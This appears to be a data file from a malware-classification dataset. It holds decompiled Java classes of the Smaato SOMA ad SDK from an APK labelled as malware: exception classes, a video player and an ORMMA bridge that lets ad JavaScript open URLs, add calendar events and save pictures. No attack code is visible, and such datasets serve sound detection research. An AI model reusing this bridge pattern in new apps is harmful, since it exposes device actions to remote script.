"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToTriggerTransitionCloseOrmmaBanner.code","public class UnableToTriggerTransitionCloseOrmmaBanner extends Exception {   private static final long serialVersionUID=1;   public UnableToTriggerTransitionCloseOrmmaBanner(){   }   public UnableToTriggerTransitionCloseOrmmaBanner(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToTriggerTransitionDisplayBanner.code","public class UnableToTriggerTransitionDisplayBanner extends Exception {   private static final long serialVersionUID=1;   public UnableToTriggerTransitionDisplayBanner(){   }   public UnableToTriggerTransitionDisplayBanner(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToTriggerTransitionExpandBanner.code","public class UnableToTriggerTransitionExpandBanner extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToViewFullScreenBanner.code","public class UnableToViewFullScreenBanner extends UnableToNotifyBannerIdle {   private static final long serialVersionUID=1;   public UnableToViewFullScreenBanner(){   }   public UnableToViewFullScreenBanner(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnblockingLoadingStateFailedException.code","public class UnblockingLoadingStateFailedException extends Exception {   private static final long serialVersionUID=1;   public UnblockingLoadingStateFailedException(){   }   public UnblockingLoadingStateFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnknownAdDimensionException.code","public class UnknownAdDimensionException extends Exception {   private static final long serialVersionUID=1;   public UnknownAdDimensionException(){   }   public UnknownAdDimensionException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnknownAdTypeException.code","public class UnknownAdTypeException extends Exception {   private static final long serialVersionUID=1;   public UnknownAdTypeException(){   }   public UnknownAdTypeException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnknownBannerStatusException.code","public class UnknownBannerStatusException extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnknownGenderException.code","public class UnknownGenderException extends Exception {   private static final long serialVersionUID=1;   public UnknownGenderException(){   }   public UnknownGenderException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnknownStringAdTypeValue.code","public class UnknownStringAdTypeValue extends Exception {   private static final long serialVersionUID=1;   public UnknownStringAdTypeValue(){   }   public UnknownStringAdTypeValue(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnknownStringGenderValue.code","public class UnknownStringGenderValue extends Exception {   private static final long serialVersionUID=1;   public UnknownStringGenderValue(){   }   public UnknownStringGenderValue(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnknownStringValueForAdDimension.code","public class UnknownStringValueForAdDimension extends Exception {   private static final long serialVersionUID=1;   public UnknownStringValueForAdDimension(){   }   public UnknownStringValueForAdDimension(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnrecognizedBannerStatusValue.code","public class UnrecognizedBannerStatusValue extends Exception {   private static final long serialVersionUID=1;   public UnrecognizedBannerStatusValue(){   }   public UnrecognizedBannerStatusValue(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnrecognizedErrorCodeValue.code","public class UnrecognizedErrorCodeValue extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnrecognizedStringErrorCodeValue.code","public class UnrecognizedStringErrorCodeValue extends Exception {   private static final long serialVersionUID=1;   public UnrecognizedStringErrorCodeValue(){   }   public UnrecognizedStringErrorCodeValue(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UserSettingsNotFoundException.code","public class UserSettingsNotFoundException extends Exception {   private static final long serialVersionUID=1;   public UserSettingsNotFoundException(){   }   public UserSettingsNotFoundException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UTF8EncodingFailedException.code","public class UTF8EncodingFailedException extends Exception {   public UTF8EncodingFailedException(){   }   public UTF8EncodingFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\VideoChromeContextFailed.code","public class VideoChromeContextFailed extends Exception {   private static final long serialVersionUID=1;   public VideoChromeContextFailed(){   }   public VideoChromeContextFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\VideoPlayerInstantiationException.code","public class VideoPlayerInstantiationException extends Exception {   private static final long serialVersionUID=1;   public VideoPlayerInstantiationException(){   }   public VideoPlayerInstantiationException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\VideoRootViewNotFoundException.code","public class VideoRootViewNotFoundException extends Exception {   private static final long serialVersionUID=1;   public VideoRootViewNotFoundException(){   }   public VideoRootViewNotFoundException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\VideoViewInstantiationException.code","public class VideoViewInstantiationException extends Exception {   private static final long serialVersionUID=1;   public VideoViewInstantiationException(){   }   public VideoViewInstantiationException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\WebViewInitialisationFailed.code","public class WebViewInitialisationFailed extends Exception {   private static final long serialVersionUID=1;   public WebViewInitialisationFailed(){   }   public WebViewInitialisationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\XmlParserFactoryInstantiationException.code","public class XmlParserFactoryInstantiationException extends Exception {   private static final long serialVersionUID=1;   public XmlParserFactoryInstantiationException(){   }   public XmlParserFactoryInstantiationException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal\AnonymousClass10.code","class AnonymousClass10 extends CrashReportTemplate<Void> {   final VideoPlayerView a;   @Override public Void b() throws Exception {     Log.v(""SOMA"",""Video download started"");     this.a.d.setEnabled(true);     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal\AnonymousClass11.code","class AnonymousClass11 extends CrashReportTemplate<Void> {   final VideoPlayerView a;   private final ReceivedBannerInterface b;   @Override public Void b() throws Exception {     this.a.e=this.b;     Log.v(""SOMA"",""Video url download finished (loading video)"");     this.a.b.setVideoPath(this.b.f());     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal\AnonymousClass13.code","class AnonymousClass13 extends CrashReportTemplate<Void> {   final VideoPlayerView a;   @Override public Void b() throws Exception {     this.a.b.stopPlayback();     this.a.f=VideoInterface.VideoState.STOPPED;     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal\AnonymousClass14.code","class AnonymousClass14 extends CrashReportTemplate<Void> {   final VideoPlayerView a;   @Override public Void b() throws Exception {     this.a.b.pause();     this.a.f=VideoInterface.VideoState.PAUSED;     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal\DefaultFactory.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1cd15462"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal\ReceivedBanner.code","public class ReceivedBanner implements ReceivedBannerInterface {   public static final String TAG=""SOMA_Banner"";   private String b;   private AdType d;   private String e;   private String f;   private List<String> g;   private String h;   private String i;   private String j;   private boolean a=false;   private BannerStatus c=BannerStatus.ERROR;   private ErrorCode k=ErrorCode.NO_ERROR;   private String l="""";   public final void a(  String str){     this.b=str;   }   @Override public final BannerStatus a(){     return this.c;   }   public final void a(  BannerStatus bannerStatus){     this.c=bannerStatus;   }   @Override public final AdType b(){     return this.d;   }   public final void a(  AdType adType){     this.d=adType;   }   @Override public final String c(){     return this.e;   }   public final void b(  String str){     this.e=str;   }   @Override public final String d(){     return this.f;   }   public final void c(  String str){     this.f=str;   }   @Override public final List<String> e(){     return this.g;   }   public final void a(  List<String> list){     this.g=list;   }   @Override public final String f(){     return this.h;   }   public final void d(  String str){     this.h=str;   }   @Override public final String g(){     return this.i;   }   public final void e(  String str){     this.i=str;   }   @Override public final String h(){     return this.j;   }   public final void f(  String str){     this.j=str;   }   @Override public final ErrorCode i(){     return this.k;   }   public final void a(  ErrorCode errorCode){     this.k=errorCode;   }   public final void g(  String str){     this.l=str;   }   @Override public final void a(  Context context) throws OpeningLandingPageFailed {     try {       Debugger.a(new Object(){       } );       if (!this.a && d() != null && d().length() > 0) {         this.a=true;         context.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(d())));       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new OpeningLandingPageFailed(e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal\VideoPlayerView.code","public class VideoPlayerView extends FrameLayout implements VideoInterface {   private static final String TAG=""SOMA"";   Context a;   VideoView b;   VideoInterface c;   ProgressBar d;   ReceivedBannerInterface e;   VideoInterface.VideoState f;   VideoListener g;   public VideoPlayerView(  final Context context,  AttributeSet attributeSet,  int i){     super(context,attributeSet,i);     this.a=null;     this.b=null;     this.c=null;     this.d=null;     this.e=null;     this.f=VideoInterface.VideoState.EMPTY;     this.g=new VideoListener(){       @Override public void a(      VideoInterface videoInterface) throws StartingVideoFailed {         try {           videoInterface.a();         }  catch (        RuntimeException e) {           throw e;         } catch (        Exception e2) {           throw new StartingVideoFailed(e2);         }       }       @Override public void b(      VideoInterface videoInterface){       }     } ;     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         VideoPlayerView.this.a(context);         return null;       }     } .c();   }   public VideoPlayerView(  final Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.a=null;     this.b=null;     this.c=null;     this.d=null;     this.e=null;     this.f=VideoInterface.VideoState.EMPTY;     this.g=new VideoListener(){       @Override public void a(      VideoInterface videoInterface) throws StartingVideoFailed {         try {           videoInterface.a();         }  catch (        RuntimeException e) {           throw e;         } catch (        Exception e2) {           throw new StartingVideoFailed(e2);         }       }       @Override public void b(      VideoInterface videoInterface){       }     } ;     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         VideoPlayerView.this.a(context);         return null;       }     } .c();   }   public VideoPlayerView(  final Context context){     super(context);     this.a=null;     this.b=null;     this.c=null;     this.d=null;     this.e=null;     this.f=VideoInterface.VideoState.EMPTY;     this.g=new VideoListener(){       @Override public void a(      VideoInterface videoInterface) throws StartingVideoFailed {         try {           videoInterface.a();         }  catch (        RuntimeException e) {           throw e;         } catch (        Exception e2) {           throw new StartingVideoFailed(e2);         }       }       @Override public void b(      VideoInterface videoInterface){       }     } ;     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         VideoPlayerView.this.a(context);         return null;       }     } .c();   }   public void setVideoListener(  VideoListener videoListener){     this.g=videoListener;   }   public void a(  Context context) throws VideoPlayerInstantiationException {     try {       Debugger.a(new Object(){       } );       this.a=context;       this.c=this;       this.b=new VideoView(context);       FrameLayout.LayoutParams layoutParams=new FrameLayout.LayoutParams(-1,-1);       layoutParams.gravity=17;       this.b.setLayoutParams(layoutParams);       this.b.setOnPreparedListener(new MediaPlayer.OnPreparedListener(){         @Override public void onPrepared(        MediaPlayer mediaPlayer){           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               VideoPlayerView.this.d.setEnabled(false);               VideoPlayerView.this.d.setVisibility(8);               VideoPlayerView.this.f=VideoInterface.VideoState.STOPPED;               VideoPlayerView.this.g.a(VideoPlayerView.this.c);               Debugger.a(new LogMessage(""SOMA"",""Starting Video"",1,DebugCategory.VERVOSE));               return null;             }           } .c();         }       } );       this.b.setOnCompletionListener(new MediaPlayer.OnCompletionListener(){         @Override public void onCompletion(        MediaPlayer mediaPlayer){           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               VideoPlayerView.this.f=VideoInterface.VideoState.FINISHED;               VideoPlayerView.this.g.b(VideoPlayerView.this.c);               return null;             }           } .c();         }       } );       this.b.setOnErrorListener(new MediaPlayer.OnErrorListener(){         @Override public boolean onError(        MediaPlayer mediaPlayer,        final int i,        int i2){           return new CrashReportTemplate<Boolean>(){             @Override public Boolean b() throws Exception {               VideoPlayerView.this.d.setEnabled(false);               VideoPlayerView.this.d.setVisibility(8);               Log.v(""SOMA"",""Video error: "" + i);               return false;             }           } .c().booleanValue();         }       } );       this.b.setOnTouchListener(new View.OnTouchListener(){         @Override public boolean onTouch(        View view,        MotionEvent motionEvent){           return new CrashReportTemplate<Boolean>(){             @Override public Boolean b() throws Exception {               if (VideoPlayerView.this.e != null) {                 VideoPlayerView.this.e.a(VideoPlayerView.this.a);               }               Log.v(""SOMA"",""Video clicked"");               return true;             }           } .c().booleanValue();         }       } );       addView(this.b);       this.d=new ProgressBar(context);       this.d.setLayoutParams(new FrameLayout.LayoutParams(-2,-2,17));       this.d.setIndeterminate(true);       addView(this.d);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new VideoPlayerInstantiationException(e2);     }   } class AnonymousClass10 extends CrashReportTemplate<Void> {     final VideoPlayerView a;     @Override public Void b() throws Exception {       Log.v(""SOMA"",""Video download started"");       this.a.d.setEnabled(true);       return null;     }   } class AnonymousClass11 extends CrashReportTemplate<Void> {     final VideoPlayerView a;     private final ReceivedBannerInterface b;     @Override public Void b() throws Exception {       this.a.e=this.b;       Log.v(""SOMA"",""Video url download finished (loading video)"");       this.a.b.setVideoPath(this.b.f());       return null;     }   }   @Override public void a(){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         VideoPlayerView.this.b.start();         VideoPlayerView.this.f=VideoInterface.VideoState.RUNNING;         return null;       }     } .c();   } class AnonymousClass13 extends CrashReportTemplate<Void> {     final VideoPlayerView a;     @Override public Void b() throws Exception {       this.a.b.stopPlayback();       this.a.f=VideoInterface.VideoState.STOPPED;       return null;     }   } class AnonymousClass14 extends CrashReportTemplate<Void> {     final VideoPlayerView a;     @Override public Void b() throws Exception {       this.a.b.pause();       this.a.f=VideoInterface.VideoState.PAUSED;       return null;     }   }   public VideoInterface.VideoState getState(){     return this.f;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.connector\AnonymousClass1.code","public class AnonymousClass1 implements Runnable {   private final String b;   AnonymousClass1(  String str){     this.b=str;   }   @Override public void run(){     try {       if (this.b != null && !this.b.equalsIgnoreCase(""undefined"")) {         AlertDialog.Builder builder=new AlertDialog.Builder(OrmmaBridge.this.d);         AlertDialog.Builder cancelable=builder.setMessage(""Do you want to save this picture into your photo album ?"").setCancelable(false);         final String str=this.b;         cancelable.setPositiveButton(""Yes"",new DialogInterface.OnClickListener(){           @Override public void onClick(          DialogInterface dialogInterface,          int i){             final String str2=str;             new CrashReportTemplate<Void>(){               @Override public Void b() throws Exception {                 new ImageDownloader().execute(new ImageDownloadProperties(str2,OrmmaBridge.this.d));                 return null;               }             } .c();           }         } ).setNegativeButton(""No"",new DialogInterface.OnClickListener(){           @Override public void onClick(          final DialogInterface dialogInterface,          int i){             new CrashReportTemplate<Void>(){               @Override public Void b() throws Exception {                 dialogInterface.cancel();                 return null;               }             } .c();           }         } );         builder.create().show();       }  else {         Debugger.a(new LogMessage(""SOMA_Bridge"",""Bad URL: "" + this.b,1,DebugCategory.WARNING));       }     }  catch (    Throwable th) {       Debugger.a(new LogMessage(""SOMA_Bridge"",""Unable to Store Picture !!"",2,DebugCategory.WARNING));     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.connector\AnonymousClass11.code","public class AnonymousClass11 extends CrashReportTemplate<Void> {   private final String b;   AnonymousClass11(  String str){     this.b=str;   } public class AnonymousClass1 implements Runnable {     private final String b;     AnonymousClass1(    String str){       this.b=str;     }     @Override public void run(){       try {         if (this.b != null && !this.b.equalsIgnoreCase(""undefined"")) {           AlertDialog.Builder builder=new AlertDialog.Builder(OrmmaBridge.this.d);           AlertDialog.Builder cancelable=builder.setMessage(""Do you want to save this picture into your photo album ?"").setCancelable(false);           final String str=this.b;           cancelable.setPositiveButton(""Yes"",new DialogInterface.OnClickListener(){             @Override public void onClick(            DialogInterface dialogInterface,            int i){               final String str2=str;               new CrashReportTemplate<Void>(){                 @Override public Void b() throws Exception {                   new ImageDownloader().execute(new ImageDownloadProperties(str2,OrmmaBridge.this.d));                   return null;                 }               } .c();             }           } ).setNegativeButton(""No"",new DialogInterface.OnClickListener(){             @Override public void onClick(            final DialogInterface dialogInterface,            int i){               new CrashReportTemplate<Void>(){                 @Override public Void b() throws Exception {                   dialogInterface.cancel();                   return null;                 }               } .c();             }           } );           builder.create().show();         }  else {           Debugger.a(new LogMessage(""SOMA_Bridge"",""Bad URL: "" + this.b,1,DebugCategory.WARNING));         }       }  catch (      Throwable th) {         Debugger.a(new LogMessage(""SOMA_Bridge"",""Unable to Store Picture !!"",2,DebugCategory.WARNING));       }     }   }   @Override public Void b() throws Exception {     ((Activity)OrmmaBridge.this.d).runOnUiThread(new AnonymousClass1(this.b));     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.connector\OrmmaBridge.code","public class OrmmaBridge {   private static final String EXTERNAL_BROWSER_TAG="" in external browser."";   public static final int MRAID_VERSION=2;   public final String TAG=""SOMA_Bridge"";   JSONObject a=null;   private AbstractBannerPackage b;   private Handler c;   private Context d;   private WebView e;   public OrmmaBridge(  Handler handler,  Context context,  AbstractBannerPackage abstractBannerPackage){     this.b=null;     this.c=null;     this.d=null;     this.c=handler;     this.d=context;     this.b=abstractBannerPackage;   }   @JavascriptInterface public void showAlert(  final String str){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         Debugger.a(new LogMessage(""SOMA_Bridge"",""alert "" + str,1,DebugCategory.INFO));         return null;       }     } .c();   }   @JavascriptInterface public void activate(  String str){   }   @JavascriptInterface public void deactivate(  String str){   }   @JavascriptInterface public void close(){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         Debugger.a(new LogMessage(""SOMA_Bridge"",""closing ..."",1,DebugCategory.INFO));         OrmmaBridge.this.c.sendMessage(OrmmaBridge.this.c.obtainMessage(Values.MESSAGE_CLOSE));         return null;       }     } .c();   }   @JavascriptInterface public void legacyExpand(  int i,  int i2,  int i3,  int i4,  String str,  String str2){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         if (!OrmmaBridge.this.b.e()) {           Debugger.a(new LogMessage(""SOMA_Bridge"",""legacyExpand"",1,DebugCategory.INFO));           OrmmaBridge.this.c.sendMessage(OrmmaBridge.this.c.obtainMessage(101));           return null;         }         return null;       }     } .c();   }   @JavascriptInterface public void legacyExpand(){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         if (!OrmmaBridge.this.b.e()) {           Debugger.a(new LogMessage(""SOMA_Bridge"",""legacyExpand "",1,DebugCategory.INFO));           OrmmaBridge.this.c.sendMessage(OrmmaBridge.this.c.obtainMessage(101));           return null;         }         return null;       }     } .c();   }   @JavascriptInterface public void expand(  int i,  int i2,  final int i3,  final int i4,  String str,  String str2){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         Debugger.a(new LogMessage(""SOMA_Bridge"",""expanding to : "" + i3 + ""x""+ i4,1,DebugCategory.INFO));         OrmmaBridge.this.c.sendMessage(OrmmaBridge.this.c.obtainMessage(101,i3,i4));         return null;       }     } .c();   }   @JavascriptInterface public void hide(){   }   @JavascriptInterface public void open(  final String str){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         OrmmaBridge.this.a(str);         return null;       }     } .c();   }   @JavascriptInterface public void open(  final String str,  boolean z,  boolean z2,  boolean z3){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         OrmmaBridge.this.a(str);         return null;       }     } .c();   }   @JavascriptInterface protected void a(  final String str) throws PageRedirectionFailed {     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         Debugger.a(new LogMessage(""SOMA_Bridge"",""Opening URL "" + str + OrmmaBridge.EXTERNAL_BROWSER_TAG,1,DebugCategory.INFO));         OrmmaBridge.this.d.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(str)));         return null;       }     } .c();   }   @JavascriptInterface public void openMap(  String str,  boolean z){   }   @JavascriptInterface public void playAudio(  String str,  boolean z,  boolean z2,  boolean z3,  int i,  String str2,  String str3){   }   @JavascriptInterface public void playVideo(  String str,  boolean z,  boolean z2,  boolean z3,  boolean z4,  int i,  String str2,  String str3){   }   @JavascriptInterface public void resize(  int i,  int i2){   }   @JavascriptInterface public void show(){   }   @JavascriptInterface public void foundORMMAAd(){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         Debugger.a(new LogMessage(""SOMA_Bridge"",""Found ORMMA/MRAID banner"",1,DebugCategory.DEBUG));         OrmmaBridge.this.b.a(true);         return null;       }     } .c();   }   public WebView getWebView(){     return this.e;   }   public void setWebView(  WebView webView){     this.e=webView;   }   @JavascriptInterface public void setResizeProperties(  String str){     try {       Debugger.a(new LogMessage(""SOMA_Bridge"",""setResizeProperties="" + str,1,DebugCategory.INFO));       this.a=new JSONObject(str);     }  catch (    Throwable th) {       Debugger.a(new LogMessage(""SOMA_Bridge"",""setResizeProperties "" + th.getMessage(),1,DebugCategory.INFO));     }   }   @JavascriptInterface public void resize(){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         String optString=OrmmaBridge.this.a.optString(""width"");         String optString2=OrmmaBridge.this.a.optString(""height"");         if (optString != null && optString2 != null && optString.length() > 0 && optString2.length() > 0) {           int parseInt=Integer.parseInt(optString);           int parseInt2=Integer.parseInt(optString2);           Debugger.a(new LogMessage(""SOMA_Bridge"",""resize : width="" + parseInt + "" height=""+ parseInt2,1,DebugCategory.INFO));           OrmmaBridge.this.c.sendMessage(OrmmaBridge.this.c.obtainMessage(Values.MESSAGE_RESIZE,parseInt,parseInt2));           return null;         }         return null;       }     } .c();   } public class AnonymousClass11 extends CrashReportTemplate<Void> {     private final String b;     AnonymousClass11(    String str){       this.b=str;     } public class AnonymousClass1 implements Runnable {       private final String b;       AnonymousClass1(      String str){         this.b=str;       }       @Override public void run(){         try {           if (this.b != null && !this.b.equalsIgnoreCase(""undefined"")) {             AlertDialog.Builder builder=new AlertDialog.Builder(OrmmaBridge.this.d);             AlertDialog.Builder cancelable=builder.setMessage(""Do you want to save this picture into your photo album ?"").setCancelable(false);             final String str=this.b;             cancelable.setPositiveButton(""Yes"",new DialogInterface.OnClickListener(){               @Override public void onClick(              DialogInterface dialogInterface,              int i){                 final String str2=str;                 new CrashReportTemplate<Void>(){                   @Override public Void b() throws Exception {                     new ImageDownloader().execute(new ImageDownloadProperties(str2,OrmmaBridge.this.d));                     return null;                   }                 } .c();               }             } ).setNegativeButton(""No"",new DialogInterface.OnClickListener(){               @Override public void onClick(              final DialogInterface dialogInterface,              int i){                 new CrashReportTemplate<Void>(){                   @Override public Void b() throws Exception {                     dialogInterface.cancel();                     return null;                   }                 } .c();               }             } );             builder.create().show();           }  else {             Debugger.a(new LogMessage(""SOMA_Bridge"",""Bad URL: "" + this.b,1,DebugCategory.WARNING));           }         }  catch (        Throwable th) {           Debugger.a(new LogMessage(""SOMA_Bridge"",""Unable to Store Picture !!"",2,DebugCategory.WARNING));         }       }     }     @Override public Void b() throws Exception {       ((Activity)OrmmaBridge.this.d).runOnUiThread(new AnonymousClass1(this.b));       return null;     }   }   @JavascriptInterface public void storePicture(  String str){     new AnonymousClass11(str).c();   }   @JavascriptInterface public void createCalendarEvent(  final String str){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         new CalendarEventCreator(new SomaCalendar(new JSONObject(str)),OrmmaBridge.this.d);         return null;       }     } .c();   }   @JavascriptInterface public void playVideo(  final String str){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         if (str != null && !str.equalsIgnoreCase(""undefined"") && str.length() > 0) {           OrmmaBridge.this.d.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(str)));           return null;         }         Debugger.a(new LogMessage(""SOMA_Bridge"",""Bad URL: "" + str,1,DebugCategory.WARNING));         return null;       }     } .c();   }   public void setContext(  Context context){     this.d=context;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.internal.connector\OrmmaConnector.code","public class OrmmaConnector {   public static final String TAG=""OrmmaConnector"";   private BaseView a=null;   private WebView b=null;   private float c;   private WindowManager d;   public OrmmaConnector(  Context context) throws OrmmaConnectorInstantiationFailed {     this.c=0.0f;     try {       DisplayMetrics displayMetrics=new DisplayMetrics();       this.d=(WindowManager)context.getSystemService(""window"");       this.d.getDefaultDisplay().getMetrics(displayMetrics);       this.c=displayMetrics.density;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new OrmmaConnectorInstantiationFailed(e2);     }   }   public void a(  BaseView baseView){     this.a=baseView;   }   public void a(  WebView webView){     this.b=webView;   }   private void b(  String str) throws UnableToInjectJavaScript {     try {       Debugger.a(new Object(){       } );       Debugger.a(new LogMessage(TAG,""Injecting "" + str,1,DebugCategory.DEBUG));       this.b.loadUrl(""javascript:"" + str);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToInjectJavaScript(e2);     }   }   public void a(  String str) throws NotifyingSizeChangedFailed {     try {       Debugger.a(new Object(){       } );       b(""window.ormmaview.fireChangeEvent({state: '"" + str + ""', size:{ width:""+ ((int)(this.b.getWidth() / this.c))+ "", height:""+ ((int)(this.b.getHeight() / this.c))+ ""}});"");     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new NotifyingSizeChangedFailed(e2);     }   }   public void a() throws UnableToNotifyBannerLoaded {     try {       Debugger.a(new Object(){       } );       b(""window.ormmaview.fireChangeEvent({ state: 'default', size: { width: "" + ((int)(this.b.getWidth() / this.c)) + "", height: ""+ ((int)(this.b.getHeight() / this.c))+ ""}, maxSize: ""+ b()+ "", screenSize: ""+ b()+ "", defaultPosition: { x:""+ ((int)(this.a.getLeft() / this.c))+ "", y: ""+ ((int)(this.a.getTop() / this.c))+ "", width: ""+ ((int)(this.a.getWidth() / this.c))+ "", height: ""+ ((int)(this.a.getHeight() / this.c))+ "" },supports: [ 'level-1', 'screen','sms','phone','email','calendar','tel','inlineVideo','storePicture'] });"");     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToNotifyBannerLoaded(e2);     }   }   private String b() throws UnableToGetScreenSize {     try {       Debugger.a(new Object(){       } );       DisplayMetrics displayMetrics=new DisplayMetrics();       this.d.getDefaultDisplay().getMetrics(displayMetrics);       return ""{ width: "" + ((int)(displayMetrics.widthPixels / displayMetrics.density)) + "", height: ""+ ((int)(displayMetrics.heightPixels / displayMetrics.density))+ ""}"";     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToGetScreenSize(e2);     }   } } "
